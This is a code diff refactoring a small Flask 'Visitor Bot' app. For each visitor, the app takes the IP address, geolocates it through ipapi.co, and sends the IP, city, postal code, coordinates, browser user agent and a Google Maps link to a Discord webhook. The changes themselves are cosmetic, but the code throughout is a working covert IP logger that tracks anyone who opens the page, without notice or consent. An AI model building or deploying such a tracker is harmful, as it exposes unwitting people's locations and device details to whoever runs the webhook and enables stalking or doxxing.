@@ -5,27 +5,23 @@ import os
 
 app = Flask(__name__)
 
-# Make sure the webhook URL is set correctly
+# Your Discord Webhook URL
 DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN")
 
 logged_ips = set()
 
 def get_real_ip():
-    """Extract the real IP address from the request (handling proxies properly)"""
+    """Extract the real IP address from the request"""
     xff = request.headers.get("X-Forwarded-For", "").split(",")
-    # Handle multiple proxies by grabbing the first IP address in the list
-    real_ip = xff[0].strip() if xff else request.remote_addr
-    return real_ip
+    return xff[0].strip() if xff else request.remote_addr
 
 def get_visitor_info(ip, user_agent):
     """Get geolocation information based on IP"""
     try:
-        # Request data from ipapi or any other geolocation service
         r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
         
         if r.status_code == 200:
             details = r.json()
-            print(f"API Response: {details}")  # Debugging line to check the API response
         else:
             details = {}
             print(f"API Error: Status Code {r.status_code}")
@@ -35,13 +31,7 @@ def get_visitor_info(ip, user_agent):
 
     lat = details.get("latitude", 0)
     lon = details.get("longitude", 0)
-
-    # Check and log coordinates for debugging
-    print(f"Latitude: {lat}, Longitude: {lon}")
     
-    if lat == 0 and lon == 0:
-        print("Warning: Using fallback coordinates (0,0)")
-
     return {
         "ip": ip,
         "user_agent": user_agent,
@@ -57,37 +47,21 @@ def get_visitor_info(ip, user_agent):
     }
 
 def send_to_discord(info):
-    """Send the information to the Discord webhook with a fancier style"""
+    """Send the information to Discord webhook"""
     embed = {
         "username": "🌍 Visitor Bot",
-        "avatar_url": "https://example.com/your-avatar-image.png",  # Optional: Custom Avatar
         "embeds": [{
             "title": f"🚶‍♂️ New Visitor from {info['country']}",
             "description": "Here’s a breakdown of the visitor's details:",
-            "color": 7506394,  # Light teal color
+            "color": 7506394,
             "fields": [
-                {
-                    "name": "🖥️ IP & Location",
-                    "value": f"**IP:** `{info['ip']}`\n**City:** {info['city']} ({info['region']}, {info['country']})\n**Postal Code:** {info['zip']}",
-                    "inline": False
-                },
-                {
-                    "name": "📱 User Agent",
-                    "value": f"**Browser/Device:** `{info['user_agent']}`",
-                    "inline": False
-                },
-                {
-                    "name": "🌍 Google Maps Location",
-                    "value": f"[Click to view on Google Maps](https://www.google.com/maps?q={info['lat']},{info['lon']})",
-                    "inline": False
-                }
+                {"name": "🖥️ IP & Location", "value": f"**IP:** `{info['ip']}`\n**City:** {info['city']} ({info['region']}, {info['country']})\n**Postal Code:** {info['zip']}", "inline": False},
+                {"name": "📱 User Agent", "value": f"**Browser/Device:** `{info['user_agent']}`", "inline": False},
+                {"name": "🌍 Google Maps Location", "value": f"[Click to view on Google Maps](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False}
             ],
             "footer": {
                 "text": f"🔗 Visit logged at: {info['date']} {info['time']} (GMT)",
                 "icon_url": "https://example.com/alarm-clock-icon.png"
-            },
-            "thumbnail": {
-                "url": "https://example.com/thumbnail-image.png"  # Optional: Custom thumbnail
             }
         }]
     }
